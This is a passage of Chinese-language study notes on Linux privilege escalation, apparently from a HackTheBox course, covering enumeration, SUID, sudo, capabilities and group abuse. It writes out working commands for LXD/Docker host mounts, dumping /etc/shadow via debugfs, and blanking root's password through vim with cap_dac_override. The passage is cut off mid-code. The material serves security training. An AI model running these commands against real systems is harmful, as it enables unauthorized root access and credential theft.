class="line">-rwxr-xr-x  1 root root 1187 Sep  5  2019 dpkg</span><br><span class="line">-rwxr-xr-x  1 root root  377 Jan 21  2019 logrotate</span><br><span class="line">-rwxr-xr-x  1 root root 1123 Feb 25  2020 man-db</span><br><span class="line">-rw-r--r--  1 root root  102 Feb 13  2020 .placeholder</span><br><span class="line">-rwxr-xr-x  1 root root 4574 Jul 18  2019 popularity-contest</span><br><span class="line">-rwxr-xr-x  1 root root  214 Apr  2  2020 update-notifier-common</span><br></pre></td></tr></table></figure><h2 id="Proc"><a href="#Proc" class="headerlink" title="Proc"></a>Proc</h2><p><a href="https://man7.org/linux/man-pages/man5/proc.5.html">proc 文件系统</a>( <code>proc</code> &#x2F; <code>procfs</code>)是 Linux 中的一个特殊文件系统，其中包含有关系统进程、硬件和其他系统信息的信息。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">$ find /proc -name cmdline -exec cat &#123;&#125; \; 2&gt;/dev/null | tr &quot; &quot; &quot;\n&quot;</span><br><span class="line"></span><br><span class="line">...SNIP...</span><br><span class="line">startups/usr/lib/packagekit/packagekitd/usr/lib/packagekit/packagekitd/usr/lib/packagekit/packagekitd/usr/lib/packagekit/packagekitdroot@10.129.14.200sshroot@10.129.14.200sshd:</span><br><span class="line">htb-student</span><br><span class="line">[priv]sshd:</span><br><span class="line">htb-student</span><br><span class="line">[priv]/usr/bin/ssh-agent-D-a/run/user/1000/keyring/.ssh/usr/bin/ssh-agent-D-a/run/user/1000/keyring/.sshsshd:</span><br><span class="line">htb-student@pts/2sshd:</span><br></pre></td></tr></table></figure><h2 id="已安装的包"><a href="#已安装的包" class="headerlink" title="已安装的包"></a>已安装的包</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">$ apt list --installed | tr &quot;/&quot; &quot; &quot; | cut -d&quot; &quot; -f1,3 | sed &#x27;s/[0-9]://g&#x27; | tee -a installed_pkgs.list</span><br><span class="line"></span><br><span class="line">Listing...                                                 </span><br><span class="line">accountsservice-ubuntu-schemas 0.0.7+17.10.20170922-0ubuntu1                   </span><br><span class="line">accountsservice 0.6.55-0ubuntu12~20.04.5                   </span><br><span class="line">acl 2.2.53-6                                               </span><br><span class="line">acpi-support 0.143                                         </span><br><span class="line">acpid 2.0.32-1ubuntu1</span><br><span class="line">...SNIP...</span><br></pre></td></tr></table></figure><h2 id="sudo"><a href="#sudo" class="headerlink" title="sudo"></a>sudo</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$ sudo -V</span><br><span class="line"></span><br><span class="line">Sudo version 1.8.31</span><br><span class="line">Sudoers policy plugin version 1.8.31</span><br><span class="line">Sudoers file grammar version 46</span><br><span class="line">Sudoers I/O plugin version 1.8.31</span><br></pre></td></tr></table></figure><h2 id="二进制文件"><a href="#二进制文件" class="headerlink" title="二进制文件"></a>二进制文件</h2><p><a href="https://gtfobins.github.io/">GTFObins</a></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">$ ls -l /bin /usr/bin/ /usr/sbin/</span><br><span class="line"></span><br><span class="line">lrwxrwxrwx 1 root root     7 Oct 27 11:14 /bin -&gt; usr/bin</span><br><span class="line"></span><br><span class="line">/usr/bin/:</span><br><span class="line">total 175160</span><br><span class="line">-rwxr-xr-x 1 root root       31248 May 19  2020  aa-enabled</span><br><span class="line">-rwxr-xr-x 1 root root       35344 May 19  2020  aa-exec</span><br><span class="line">-rwxr-xr-x 1 root root       22912 Apr 14  2021  aconnect</span><br><span class="line">-rwxr-xr-x 1 root root       19016 Nov 28  2019  acpi_listen</span><br><span class="line">-rwxr-xr-x 1 root root        7415 Oct 26  2021  add-apt-repository</span><br><span class="line">-rwxr-xr-x 1 root root       30952 Feb  7  2022  addpart</span><br><span class="line">lrwxrwxrwx 1 root root          26 Oct 20  2021  addr2line -&gt; x86_64-linux-gnu-addr2line</span><br><span class="line">...SNIP...</span><br><span class="line"></span><br><span class="line">/usr/sbin/:</span><br><span class="line">total 32500</span><br><span class="line">-rwxr-xr-x 1 root root      3068 Mai 19  2020 aa-remove-unknown</span><br><span class="line">-rwxr-xr-x 1 root root      8839 Mai 19  2020 aa-status</span><br><span class="line">-rwxr-xr-x 1 root root       139 Jun 18  2019 aa-teardown</span><br><span class="line">-rwxr-xr-x 1 root root     14728 Feb 25  2020 accessdb</span><br><span class="line">-rwxr-xr-x 1 root root     60432 Nov 28  2019 acpid</span><br><span class="line">-rwxr-xr-x 1 root root      3075 Jul  4 18:20 addgnupghome</span><br><span class="line">lrwxrwxrwx 1 root root         7 Okt 27 11:14 addgroup -&gt; adduser</span><br><span class="line">-rwxr-xr-x 1 root root       860 Dez  7  2019 add-shell</span><br><span class="line">-rwxr-xr-x 1 root root     37785 Apr 16  2020 adduser</span><br><span class="line">-rwxr-xr-x 1 root root     69000 Feb  7  2022 agetty</span><br><span class="line">-rwxr-xr-x 1 root root      5576 Jul 31  2015 alsa</span><br><span class="line">-rwxr-xr-x 1 root root      4136 Apr 14  2021 alsabat-test</span><br><span class="line">-rwxr-xr-x 1 root root    118176 Apr 14  2021 alsactl</span><br><span class="line">-rwxr-xr-x 1 root root     26489 Apr 14  2021 alsa-info</span><br><span class="line">-rwxr-xr-x 1 root root     39088 Jul 16  2019 anacron</span><br><span class="line">...SNIP...</span><br></pre></td></tr></table></figure><h2 id="跟踪系统调用"><a href="#跟踪系统调用" class="headerlink" title="跟踪系统调用"></a>跟踪系统调用</h2><p>诊断工具<code>strace</code>可以用来跟踪和分析系统调用和信号处理。还可以使用该工具监视与安全相关的活动并识别潜在的攻击媒介，例如使用密码或令牌向远程主机发出的特定请求。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">$ strace ping -c1 10.129.112.20</span><br><span class="line"></span><br><span class="line">execve(&quot;/usr/bin/ping&quot;, [&quot;ping&quot;, &quot;-c1&quot;, &quot;10.129.112.20&quot;], 0x7ffdc8b96cc0 /* 80 vars */) = 0</span><br><span class="line">access(&quot;/etc/suid-debug&quot;, F_OK)         = -1 ENOENT (No such file or directory)</span><br><span class="line">brk(NULL)                               = 0x56222584c000</span><br><span class="line">arch_prctl(0x3001 /* ARCH_??? */, 0x7fffb0b2ea00) = -1 EINVAL (Invalid argument)</span><br><span class="line">...SNIP...</span><br><span class="line">access(&quot;/etc/ld.so.preload&quot;, R_OK)      = -1 ENOENT (No such file or directory)</span><br><span class="line">...SNIP...</span><br><span class="line">openat(AT_FDCWD, &quot;/lib/x86_64-linux-gnu/libidn2.so.0&quot;, O_RDONLY|O_CLOEXEC) = 3</span><br><span class="line">...SNIP...</span><br><span class="line">read(3, &quot;\177ELF\2\1\1\3\0\0\0\0\0\0\0\0\3\0&gt;\0\1\0\0\0P\237\2\0\0\0\0\0&quot;..., 832) = 832</span><br><span class="line">pread64(3, &quot;\6\0\0\0\4\0\0\0@\0\0\0\0\0\0\0@\0\0\0\0\0\0\0@\0\0\0\0\0\0\0&quot;..., 784, 64) = 784</span><br><span class="line">pread64(3, &quot;\4\0\0\0 \0\0\0\5\0\0\0GNU\0\2\0\0\300\4\0\0\0\3\0\0\0\0\0\0\0&quot;..., 48, 848) = 48</span><br><span class="line">...SNIP...</span><br><span class="line">socket(AF_INET, SOCK_DGRAM, IPPROTO_ICMP) = 3</span><br><span class="line">socket(AF_INET6, SOCK_DGRAM, IPPROTO_ICMPV6) = 4</span><br><span class="line">capget(&#123;version=_LINUX_CAPABILITY_VERSION_3, pid=0&#125;, NULL) = 0</span><br><span class="line">capget(&#123;version=_LINUX_CAPABILITY_VERSION_3, pid=0&#125;, &#123;effective=0, permitted=0, inheritable=0&#125;) = 0</span><br><span class="line">openat(AT_FDCWD, &quot;/usr/lib/x86_64-linux-gnu/gconv/gconv-modules.cache&quot;, O_RDONLY) = 5</span><br><span class="line">...SNIP...</span><br><span class="line">socket(AF_INET, SOCK_DGRAM, IPPROTO_IP) = 5</span><br><span class="line">connect(5, &#123;sa_family=AF_INET, sin_port=htons(1025), sin_addr=inet_addr(&quot;10.129.112.20&quot;)&#125;, 16) = 0</span><br><span class="line">getsockname(5, &#123;sa_family=AF_INET, sin_port=htons(39885), sin_addr=inet_addr(&quot;10.129.112.20&quot;)&#125;, [16]) = 0</span><br><span class="line">close(5)                                = 0</span><br><span class="line">...SNIP...</span><br><span class="line">sendto(3, &quot;\10\0\31\303\0\0\0\1eX\327c\0\0\0\0\330\254\n\0\0\0\0\0\20\21\22\23\24\25\26\27&quot;..., 64, 0, &#123;sa_family=AF_INET, sin_port=htons(0), sin_addr=inet_addr(&quot;10.129.112.20&quot;)&#125;, 16) = 64</span><br><span class="line">...SNIP...</span><br><span class="line">recvmsg(3, &#123;msg_name=&#123;sa_family=AF_INET, sin_port=htons(0), sin_addr=inet_addr(&quot;10.129.112.20&quot;)&#125;, msg_namelen=128 =&gt; 16, msg_iov=[&#123;iov_base=&quot;\0\0!\300\0\3\0\1eX\327c\0\0\0\0\330\254\n\0\0\0\0\0\20\21\22\23\24\25\26\27&quot;..., iov_len=192&#125;], msg_iovlen=1, msg_control=[&#123;cmsg_len=32, cmsg_level=SOL_SOCKET, cmsg_type=SO_TIMESTAMP_OLD, cmsg_data=&#123;tv_sec=1675057253, tv_usec=699895&#125;&#125;, &#123;cmsg_len=20, cmsg_level=SOL_IP, cmsg_type=IP_TTL, cmsg_data=[64]&#125;], msg_controllen=56, msg_flags=0&#125;, 0) = 64</span><br><span class="line">write(1, &quot;64 bytes from 10.129.112.20: icmp_se&quot;..., 57) = 57</span><br><span class="line">write(1, &quot;\n&quot;, 1)                       = 1</span><br><span class="line">write(1, &quot;--- 10.129.112.20 ping statistics --&quot;..., 34) = 34</span><br><span class="line">write(1, &quot;1 packets transmitted, 1 receive&quot;..., 60) = 60</span><br><span class="line">write(1, &quot;rtt min/avg/max/mdev = 0.287/0.2&quot;..., 50) = 50</span><br><span class="line">close(1)                                = 0</span><br><span class="line">close(2)                                = 0</span><br><span class="line">exit_group(0)                           = ?</span><br><span class="line">+++ exited with 0 +++</span><br></pre></td></tr></table></figure><h2 id="查找文件"><a href="#查找文件" class="headerlink" title="查找文件"></a>查找文件</h2><h3 id="配置文件"><a href="#配置文件" class="headerlink" title="配置文件"></a>配置文件</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">$ find / -type f \( -name *.conf -o -name *.config \) -exec ls -l &#123;&#125; \; 2&gt;/dev/null</span><br><span class="line"></span><br><span class="line">-rw-r--r-- 1 root root 448 Nov 28 12:31 /run/tmpfiles.d/static-nodes.conf</span><br><span class="line">-rw-r--r-- 1 root root 71 Nov 28 12:31 /run/NetworkManager/resolv.conf</span><br><span class="line">-rw-r--r-- 1 root root 72 Nov 28 12:31 /run/NetworkManager/no-stub-resolv.conf</span><br><span class="line">-rw-r--r-- 1 root root 0 Nov 28 12:37 /run/NetworkManager/conf.d/10-globally-managed-devices.conf</span><br><span class="line">-rw-r--r-- 1 systemd-resolve systemd-resolve 736 Nov 28 12:31 /run/systemd/resolve/stub-resolv.conf</span><br><span class="line">-rw-r--r-- 1 systemd-resolve systemd-resolve 607 Nov 28 12:31 /run/systemd/resolve/resolv.conf</span><br><span class="line">...SNIP...</span><br></pre></td></tr></table></figure><h3 id="脚本文件"><a href="#脚本文件" class="headerlink" title="脚本文件"></a>脚本文件</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">$ find / -type f -name &quot;*.sh&quot; 2&gt;/dev/null | grep -v &quot;src\|snap\|share&quot;</span><br><span class="line"></span><br><span class="line">/home/htb-student/automation.sh</span><br><span class="line">/etc/wpa_supplicant/action_wpa.sh</span><br><span class="line">/etc/wpa_supplicant/ifupdown.sh</span><br><span class="line">/etc/wpa_supplicant/functions.sh</span><br><span class="line">/etc/init.d/keyboard-setup.sh</span><br><span class="line">/etc/init.d/console-setup.sh</span><br><span class="line">/etc/init.d/hwclock.sh</span><br><span class="line">...SNIP...</span><br></pre></td></tr></table></figure><h1 id="PATH-Abuse"><a href="#PATH-Abuse" class="headerlink" title="PATH Abuse"></a>PATH Abuse</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$ PATH=.:$&#123;PATH&#125;</span><br><span class="line">$ export PATH</span><br><span class="line">$ echo $PATH</span><br><span class="line"></span><br><span class="line">.:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games</span><br></pre></td></tr></table></figure><h1 id="Special-Permissions"><a href="#Special-Permissions" class="headerlink" title="Special Permissions"></a>Special Permissions</h1><p><a href="https://gtfobins.github.io/">GTFOBins</a></p><h2 id="SUID"><a href="#SUID" class="headerlink" title="SUID"></a>SUID</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">$ find / -perm -4000 -exec ls -ldb &#123;&#125; \; 2&gt;/dev/null</span><br><span class="line"></span><br><span class="line">-rwsr-xr-x 1 root root 16728 Sep  1 19:06 /home/htb-student/shared_obj_hijack/payroll</span><br><span class="line">-rwsr-xr-x 1 root root 16728 Sep  1 22:05 /home/mrb3n/payroll</span><br><span class="line">-rwSr--r-- 1 root root 0 Aug 31 02:51 /home/cliff.moore/netracer</span><br><span class="line">-rwsr-xr-x 1 root root 40152 Nov 30  2017 /bin/mount</span><br><span class="line">-rwsr-xr-x 1 root root 40128 May 17  2017 /bin/su</span><br><span class="line">-rwsr-xr-x 1 root root 27608 Nov 30  2017 /bin/umount</span><br><span class="line">-rwsr-xr-x 1 root root 44680 May  7  2014 /bin/ping6</span><br><span class="line">-rwsr-xr-x 1 root root 30800 Jul 12  2016 /bin/fusermount</span><br><span class="line">-rwsr-xr-x 1 root root 44168 May  7  2014 /bin/ping</span><br><span class="line">-rwsr-xr-x 1 root root 142032 Jan 28  2017 /bin/ntfs-3g</span><br><span class="line">-rwsr-xr-x 1 root root 38984 Jun 14  2017 /usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic</span><br><span class="line">-rwsr-xr-- 1 root messagebus 42992 Jan 12  2017 /usr/lib/dbus-1.0/dbus-daemon-launch-helper</span><br><span class="line">-rwsr-xr-x 1 root root 14864 Jan 18  2016 /usr/lib/policykit-1/polkit-agent-helper-1</span><br><span class="line">-rwsr-sr-x 1 root root 85832 Nov 30  2017 /usr/lib/snapd/snap-confine</span><br><span class="line">-rwsr-xr-x 1 root root 428240 Jan 18  2018 /usr/lib/openssh/ssh-keysign</span><br><span class="line">-rwsr-xr-x 1 root root 10232 Mar 27  2017 /usr/lib/eject/dmcrypt-get-device</span><br><span class="line">-rwsr-xr-x 1 root root 23376 Jan 18  2016 /usr/bin/pkexec</span><br><span class="line">-rwsr-sr-x 1 root root 240 Feb  1  2016 /usr/bin/facter</span><br><span class="line">-rwsr-xr-x 1 root root 39904 May 17  2017 /usr/bin/newgrp</span><br><span class="line">-rwsr-xr-x 1 root root 32944 May 17  2017 /usr/bin/newuidmap</span><br><span class="line">-rwsr-xr-x 1 root root 49584 May 17  2017 /usr/bin/chfn</span><br><span class="line">-rwsr-xr-x 1 root root 136808 Jul  4  2017 /usr/bin/sudo</span><br><span class="line">-rwsr-xr-x 1 root root 40432 May 17  2017 /usr/bin/chsh</span><br><span class="line">-rwsr-xr-x 1 root root 32944 May 17  2017 /usr/bin/newgidmap</span><br><span class="line">-rwsr-xr-x 1 root root 75304 May 17  2017 /usr/bin/gpasswd</span><br><span class="line">-rwsr-xr-x 1 root root 54256 May 17  2017 /usr/bin/passwd</span><br><span class="line">-rwsr-xr-x 1 root root 10624 May  9  2018 /usr/bin/vmware-user-suid-wrapper</span><br><span class="line">-rwsr-xr-x 1 root root 1588768 Aug 31 00:50 /usr/bin/screen-4.5.0</span><br><span class="line">-rwsr-xr-x 1 root root 94240 Jun  9 14:54 /sbin/mount.nfs</span><br></pre></td></tr></table></figure><h2 id="SGID"><a href="#SGID" class="headerlink" title="SGID"></a>SGID</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ find / -perm -6000 -exec ls -ldb &#123;&#125; \; 2&gt;/dev/null</span><br><span class="line"></span><br><span class="line">-rwsr-sr-x 1 root root 85832 Nov 30  2017 /usr/lib/snapd/snap-confine</span><br></pre></td></tr></table></figure><h1 id="Sudo-Abuse"><a href="#Sudo-Abuse" class="headerlink" title="Sudo Abuse"></a>Sudo Abuse</h1><p>可以向某个帐户授予 sudo 权限，允许该帐户在 root（或另一个帐户）的上下文中运行某些命令，而无需更改用户或授予过多权限。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$ sudo -l</span><br><span class="line"></span><br><span class="line">Matching Defaults entries for sysadm on NIX02:</span><br><span class="line">    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin</span><br><span class="line"></span><br><span class="line">User sysadm may run the following commands on NIX02:</span><br><span class="line">    (ALL : ALL) ALL</span><br></pre></td></tr></table></figure><h1 id="Privileged-Groups"><a href="#Privileged-Groups" class="headerlink" title="Privileged Groups"></a>Privileged Groups</h1><h2 id="LXC-LXD"><a href="#LXC-LXD" class="headerlink" title="LXC &#x2F; LXD"></a>LXC &#x2F; LXD</h2><p>LXD 类似于 Docker，是 Ubuntu 的容器管理器。安装后，所有用户都会添加到 LXD 组。该组的成员身份可用于通过创建 LXD 容器、使其具有特权，然后访问主机文件系统来提升权限<code>/mnt/root</code>。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">lxd init</span><br><span class="line">lxc image import alpine.tar.gz alpine.tar.gz.root --alias alpine</span><br><span class="line">lxc init alpine r00t -c security.privileged=true</span><br><span class="line">lxc config device add r00t mydev disk source=/ path=/mnt/root recursive=true</span><br><span class="line">lxc start r00t</span><br><span class="line"></span><br><span class="line">$ lxc exec r00t /bin/sh</span><br><span class="line">~ # id</span><br><span class="line">uid=0(root) gid=0(root)</span><br><span class="line">~ # </span><br></pre></td></tr></table></figure><h2 id="Docker"><a href="#Docker" class="headerlink" title="Docker"></a>Docker</h2><p>将用户放入 docker 组本质上相当于无需密码即可获得文件系统的 root 级别访问权限。docker 组的成员可以创建新的 docker 容器。一个例子是运行命令<code>docker run -v /root:/mnt -it ubuntu</code>。此命令创建一个新的 Docker 实例，并将主机文件系统上的 &#x2F;root 目录作为卷挂载。启动容器后，就可以浏览到挂载的目录并为 root 用户检索或添加 SSH 密钥。这可以用于其他目录，例如<code>/etc</code>可用于检索文件内容<code>/etc/shadow</code>以进行离线密码破解或添加特权用户的目录。</p><h2 id="Disk"><a href="#Disk" class="headerlink" title="Disk"></a>Disk</h2><p>磁盘组中的用户对 中包含的任何设备<code>/dev</code>（例如<code>/dev/sda1</code>）具有完全访问权限，这通常是操作系统使用的主要设备。具有这些权限的攻击者可以使用<code>debugfs</code>以root 级权限访问整个文件系统。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">debugfs /dev/sda1</span><br><span class="line">dump /etc/shadow /tmp/shadow_copy</span><br><span class="line">quit</span><br></pre></td></tr></table></figure><h2 id="ADM"><a href="#ADM" class="headerlink" title="ADM"></a>ADM</h2><p>ADM 组的成员可以读取 <code>/var/log</code> 中存储的所有日志。这不会直接授予 root 访问权限，但可以利用该权限收集日志文件中存储的敏感数据或枚举用户操作和正在运行的 cron 作业。</p><p><a href="https://linux.die.net/man/8/aureport">aureport</a> 是一个生成审计系统日志摘要报告的工具。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">aureport --tty | less</span><br></pre></td></tr></table></figure><h1 id="Capabilities"><a href="#Capabilities" class="headerlink" title="Capabilities"></a>Capabilities</h1><p>Linux Capabilities 是 Linux 操作系统中的一项安全功能，允许向进程授予特定权限，从而使它们能够执行原本受限制的特定操作。</p><p>一种常见的漏洞是利用功能向未充分沙盒化或与其他进程隔离的进程授予特权，从而允许提升其特权并访问敏感信息或执行未经授权的操作。另一个潜在的漏洞是滥用或过度使用功能，这可能导致进程拥有超出其需要的权限。</p><p>设置可执行文件的功能：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo setcap cap_net_bind_service=+ep /usr/bin/vim.basic</span><br></pre></td></tr></table></figure><table><thead><tr><th>能力</th><th>描述</th></tr></thead><tbody><tr><td><code>cap_sys_admin</code></td><td>允许以管理权限执行操作，例如修改系统文件或更改系统设置。</td></tr><tr><td><code>cap_sys_chroot</code></td><td>允许更改当前进程的根目录，允许其访问原本无法访问的文件和目录。</td></tr><tr><td><code>cap_sys_ptrace</code></td><td>允许附加并调试其他进程，可能允许其访问敏感信息或修改其他进程的行为。</td></tr><tr><td><code>cap_sys_nice</code></td><td>允许提高或降低进程的优先级，从而可能使其获得原本受到限制的资源的访问权限。</td></tr><tr><td><code>cap_sys_time</code></td><td>允许修改系统时钟，可能允许它操纵时间戳或导致其他进程以意外的方式运行。</td></tr><tr><td><code>cap_sys_resource</code></td><td>允许修改系统资源限制，例如打开文件描述符的最大数量或可分配的最大内存量。</td></tr><tr><td><code>cap_sys_module</code></td><td>允许加载和卸载内核模块，可能允许其修改操作系统的行为或获取敏感信息。</td></tr><tr><td><code>cap_net_bind_service</code></td><td>允许绑定到网络端口，可能允许其访问敏感信息或执行未经授权的操作。</td></tr></tbody></table><table><thead><tr><th>值</th><th>描述</th></tr></thead><tbody><tr><td><code>=</code></td><td>此值设置可执行文件的指定功能，但不授予任何权限。如果想清除可执行文件的先前设置的功能，这将很有用。</td></tr><tr><td><code>+ep</code></td><td>此值将指定功能的有效权限和允许权限授予可执行文件。这允许可执行文件执行功能允许的操作，但不允许其执行功能不允许的任何操作。</td></tr><tr><td><code>+ei</code></td><td>此值授予可执行文件足够的、可继承的指定权限。这允许可执行文件执行该权限允许的操作，并且可执行文件生成的子进程可以继承该权限并执行相同的操作。</td></tr><tr><td><code>+p</code></td><td>此值将指定功能的允许权限授予可执行文件。这允许可执行文件执行功能允许的操作，但不允许它执行功能不允许的任何操作。如果想将功能授予可执行文件，但阻止它继承功能或允许子进程继承功能，这将很有用。</td></tr></tbody></table><p>有多种 Linux Capabilities 可用于将用户权限升级到<code>root</code>，其中包括：</p><table><thead><tr><th>能力</th><th>描述</th></tr></thead><tbody><tr><td><code>cap_setuid</code></td><td>允许进程设置其有效用户ID，该ID可用于获取其他用户（包括该<code>root</code>用户）的权限。</td></tr><tr><td><code>cap_setgid</code></td><td>允许设置其有效组ID，该组ID可用于获取另一个组（包括该<code>root</code>组）的权限。</td></tr><tr><td><code>cap_sys_admin</code></td><td>此功能提供广泛的管理权限，包括执行许多为用户保留的操作的能力<code>root</code>，例如修改系统设置以及挂载和卸载文件系统。</td></tr><tr><td><code>cap_dac_override</code></td><td>允许绕过文件读取、写入和执行权限检查。</td></tr></tbody></table><h2 id="enumeration"><a href="#enumeration" class="headerlink" title="enumeration"></a>enumeration</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$ find /usr/bin /usr/sbin /usr/local/bin /usr/local/sbin -type f -exec getcap &#123;&#125; \;</span><br><span class="line"></span><br><span class="line">/usr/bin/vim.basic cap_dac_override=eip</span><br><span class="line">/usr/bin/ping cap_net_raw=ep</span><br><span class="line">/usr/bin/mtr-packet cap_net_raw=ep</span><br></pre></td></tr></table></figure><h2 id="exploit"><a href="#exploit" class="headerlink" title="exploit"></a>exploit</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$ getcap /usr/bin/vim.basic</span><br><span class="line"></span><br><span class="line">/usr/bin/vim.basic cap_dac_override=eip</span><br><span class="line"></span><br><span class="line">$ /usr/bin/vim.basic /etc/passwd</span><br><span class="line"># 修改为这样，就可以无密码 su root</span><br><span class="line">root::0:0:root:/root:/bin/bash</span><br></pre></td></tr></table></figure><p>可以用以下命令在非交互模式下执行</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo -e &#x27;:%s/^root:[^:]*:/root::/\nwq!&#x27; | /usr/bin/vim.basic -es /etc/passwd</span><br></pre></td></tr></table></figure><h1 id="Cron-Job-Abuse"><a href="#Cron-Job-Abuse" class="headerlink" title="Cron Job Abuse"></a>Cron Job Abuse</h1><p>root crontab 几乎总是只能由根用户或具有完整 sudo 权限的用户编辑；但是，它仍然可能被滥用。根用户身份运行的可写入脚本，即使您无法读取 crontab 以了解确切的时间表，您也可能能够确定它运行的频率（即，每 12 小时创建一个 .tar.gz 文件的备份脚本）。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span 